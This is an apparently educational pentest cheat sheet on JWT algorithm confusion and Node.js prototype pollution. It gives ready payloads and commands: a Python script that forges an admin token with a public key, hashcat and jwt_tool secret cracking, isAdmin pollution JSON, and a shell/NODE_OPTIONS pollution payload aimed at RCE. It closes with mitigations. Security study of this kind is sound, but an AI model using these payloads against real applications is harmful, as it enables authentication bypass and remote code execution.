---
title: JWT and prototype pollution in Node/JS apps
tags: [web, jwt, prototype-pollution, nodejs, rce]
---

# JWT and prototype pollution

**English** | [🇪🇸 Español](node-jwt-prototype.md)

Two very common trust failures in JavaScript applications: signing tokens with the wrong algorithm and merging objects without sanitising keys.

## 1. JWT anatomy

```text
header.payload.signature      base64url(header).base64url(payload).HMAC/RSA
```

```bash
echo '<header>'  | base64 -d
echo '<payload>' | base64 -d
```

The server must verify the signature **with the algorithm it chooses**, not the one the token carries.

## 2. Algorithm confusion (RS256 → HS256)

If the backend calls `verify(token, publicKey)` without pinning the algorithm, it accepts `alg: HS256` and uses the RSA public key as the HMAC secret. The public key is… public.

```bash
# 1. grab the public key (JWKS endpoint, .well-known, cert)
curl -s http://<HOST>/.well-known/jwks.json

# 2. sign with HS256 using the public PEM as the secret
python3 - <<'PY'
import jwt
pub = open('public.pem').read()
print(jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256'))
PY
```

Variants: `alg: none` (legacy servers), `kid` with path traversal or injection, and weak secrets:

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

`jwt_tool` automates all of it:

```bash
python3 jwt_tool.py '<token>' -T          # tamper
python3 jwt_tool.py '<token>' -C -d wordlist.txt
```

## 3. Prototype pollution

A recursive `merge`/`extend` that copies keys without filtering `__proto__`, `constructor` or `prototype` modifies `Object.prototype` for the whole process:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Detection: send `?__proto__[x]=1` or a nested JSON and watch for a property that did not exist appearing in other users' responses (or an `if (user.isAdmin)` passing).

From "is admin" to RCE: if the polluted object reaches `child_process.spawn`/`execFile`, options such as `shell`, `env`, `argv0` or `NODE_OPTIONS` are inherited from the prototype:

```json
{"__proto__": {"shell": "/bin/sh", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}
```

Tooling: `ppmap`, `nodejsscan`, plus manual review of `lodash.merge`, `deep-extend`, `qs`, `express` and template engines (EJS/Pug) with known gadgets.

## 4. Typical errors

- **`invalid signature` after changing `alg`** → the server does pin the algorithm; look for `kid` or a weak secret.
- **`jwt.decode` without verification** → the flaw is in the code, not the token: prove it by changing the payload without touching the signature.
- **`base64url` with `=`** → strip padding before decoding.
- **Pollution does not persist** → the merge happens in another process/worker or the object is cloned afterwards.
- **`__proto__` blocked** → try `constructor.prototype` or `prototype` depending on the library.

## 5. Detection and mitigation

- Pin `algorithms: ['RS256']` in verification and use the public key only to verify.
- Rotate HMAC secrets, use long keys, never the public key as a secret.
- Reject `alg: none` and validate `kid` against a list.
- `Object.create(null)`, `Object.freeze(Object.prototype)` and key filters (`__proto__`, `constructor`, `prototype`) in merges.
- SAST for `jwt.verify(` without `algorithms` and for recursive merges.

MITRE: T1550, T1059, T1190.
